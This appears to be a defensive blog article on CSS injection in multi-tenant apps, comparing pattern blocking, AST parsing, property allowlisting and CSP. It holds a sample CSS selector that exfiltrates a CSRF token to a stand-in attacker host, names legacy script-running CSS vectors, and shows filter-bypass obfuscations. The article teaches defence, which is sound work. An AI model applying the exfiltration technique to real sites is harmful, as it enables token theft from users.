---
title: Understanding CSS Injection and Sanitization in Multi-Tenant Apps
excerpt: CSS is more dangerous than it looks, learn the threats and how to protect against them.
---

Multi-tenant applications often let customers customize their branding with custom CSS. This creates a powerful customization experience, but also opens security holes that many developers underestimate. CSS is not just about colors and fonts.

## Why CSS Can Be Dangerous

You might think CSS is harmless because it's "just styling." Unlike JavaScript, CSS can't directly call APIs or modify the DOM. But CSS has capabilities that make it dangerous in untrusted contexts.

### Data Exfiltration via URL Loading

CSS can load external URLs through properties like `background-image`, `list-style-image`, and the `url()` function. An attacker can use this to detect which elements exist on a page, what values form fields contain, or whether a user is logged in.

```css
input[name="csrf"][value^="a"] {
	background: url("https://attacker.com/log?char=a");
}
```

This technique works by creating many selectors, each checking if a form field's value starts with a specific character. When the browser matches a selector, it loads the corresponding URL, leaking the character to the attacker's server. Repeating this process extracts entire values character by character.

### JavaScript Execution in Legacy Browsers

Internet Explorer supported the `expression()` function, which evaluated JavaScript inside CSS. Firefox historically supported `-moz-binding` for attaching XBL bindings that could execute JavaScript. IE also had `behavior:` for HTC components.

While modern browsers don't support these, your security shouldn't depend on browser version. Some users still run outdated browsers, and defensive sanitization catches these vectors.

### External Stylesheet Loading

The `@import` rule loads external stylesheets, bypassing any inline CSS sanitization. An attacker could import a stylesheet from their server containing any malicious rules you tried to block in the original input.

## The Threat Model

Before choosing a sanitization approach, consider your threat model:

**Low risk scenarios** involve trusted users like internal employees or paying customers with contractual obligations. Here, attackers would need to compromise a trusted account first.

**Medium risk scenarios** involve semi-trusted users like customers of your customers. They have some accountability but less oversight.

**High risk scenarios** involve anonymous or low-trust users, or any situation where a malicious actor could sign up and inject CSS that affects other users.

The threat model also depends on **what data is exposed**. A branding page showing only the customer's own content has lower risk than a shared dashboard where CSS injection could affect other tenants.

## Approaches to Sanitization

There are three main approaches to CSS sanitization, each with different trade-offs.

### Pattern Blocking

The simplest approach identifies dangerous patterns and removes or rejects them. You create regex patterns for known attack vectors: `javascript:`, `expression()`, `@import`, `-moz-binding`, `behavior:`, external URLs.

**Pros:** Fast, simple to implement, handles most common attacks.

**Cons:** Can miss novel obfuscation techniques. An attacker might try `exp/*comment*/ression()` or `java\nscript:` to bypass naive patterns.

Pattern blocking works well for **low risk scenarios** or as a first line of defense combined with other approaches.

### AST Parsing and Validation

A more robust approach parses CSS into an Abstract Syntax Tree and validates each node. Libraries like `css-tree` provide fast CSS parsers that normalize the input before analysis.

**Pros:** Handles obfuscation because the parser normalizes CSS before you analyze it. You can inspect the actual structure, not just text patterns.

**Cons:** More complex to implement, slightly slower, and you need to understand CSS AST structure.

AST parsing is appropriate for **medium risk scenarios** where you need stronger security but want to give users flexibility.

### Property Allowlisting

The most secure approach only allows properties you explicitly trust. Instead of blocking dangerous patterns, you define exactly what's permitted: `color`, `background-color`, `font-family`, `margin`, `padding`, and so on.

**Pros:** Future-proof against new attack vectors. Unknown properties are automatically blocked.

**Cons:** Restrictive for users. They can only use what you've approved, which limits creative customization.

Allowlisting is appropriate for **high risk scenarios** where any tenant might be malicious and you need maximum protection.

## Trade-Offs: Security vs. Flexibility

Every sanitization decision involves trade-offs:

**Blocking external URLs** prevents data exfiltration but also prevents users from loading web fonts or background images from CDNs. You might need to provide an approved list of domains or host assets yourself.

**Removing @import** prevents external stylesheet loading but breaks workflows where users maintain CSS in separate files. Consider providing a different mechanism for stylesheet imports.

**Allowlisting properties** is secure but frustrating when users can't use `box-shadow` or `transform` because you forgot to include them. Maintaining the list requires ongoing effort.

**Silent modification vs. rejection** affects user experience. Silently removing dangerous CSS is safer but confusing when styles don't work. Rejecting invalid CSS with an error message helps users understand the limits but requires better error messaging.

## Value Validation

Even safe properties can have dangerous values. The `font-family` property normally takes font names, but could include `url()` in some contexts. The `background` shorthand can include `url()` references.

For high security scenarios, validate not just property names but also property values. Check that colors are actually color values, sizes are numeric with units, and no URLs appear where they shouldn't.

This adds implementation complexity but catches attacks that use valid properties with malicious values.

## Defense in Depth

CSS sanitization should work alongside other security measures:

**Content Security Policy (CSP)** provides a second line of defense. The `style-src` directive controls where styles can come from. Even if sanitization misses something, CSP can block external resource loading.

**Input validation at submission time** catches problems early. Users get immediate feedback rather than discovering issues later.

**Output encoding** ensures CSS doesn't break out of its context. If you're injecting CSS into an HTML attribute, make sure it can't escape the attribute.

**Monitoring and logging** helps detect attacks. Log when sanitization removes content, and watch for patterns that might indicate probing.

## When to Use Each Approach

**Use pattern blocking** when you need basic protection for trusted users, or as the first layer in a multi-layer approach. It's fast and catches obvious attacks.

**Use AST parsing** when you need reliable detection of obfuscated attacks but want to give users flexibility. It handles edge cases that regex misses.

**Use allowlisting** when you're building multi-tenant SaaS where any tenant could be malicious, or when protecting high-value targets like banking or healthcare applications.

**Combine approaches** for defense in depth. Start with pattern blocking for obvious attacks, add AST parsing for structural validation, and apply allowlisting for the strictest scenarios.

## Conclusion

CSS is more powerful than it looks. It can load resources, interact with form elements, and in legacy browsers, execute code. When you let users inject custom CSS, you're giving them capabilities that extend beyond visual styling.

The right sanitization strategy depends on your threat model. Low risk scenarios might only need pattern blocking. High risk scenarios require allowlisting with value validation. Most applications fall somewhere in between, combining multiple approaches for defense in depth.

Treat user-provided CSS with the same caution you'd apply to any untrusted input. The visual nature of CSS makes it easy to underestimate, but the security implications are real.
